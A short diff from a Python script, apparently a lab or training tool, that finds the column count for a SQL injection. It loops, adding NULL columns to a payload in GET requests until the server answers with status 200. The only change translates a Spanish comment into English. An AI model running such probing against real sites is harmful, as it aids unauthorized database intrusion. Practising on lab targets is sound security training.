@@ -11,7 +11,7 @@ def exploit_sqli_column_number(url):
     while True:
         print("Attack "+str(i)+": "+url+path+sql_payload+"--")
         r = requests.get(url+path+sql_payload+"--", verify=False)
-        if r.status_code == 200: #tambien se puede evaluar por status 500
+        if r.status_code == 200: #also can evaluate 500 status code
             return i 
         sql_payload = sql_payload+",NULL"
         i+=1
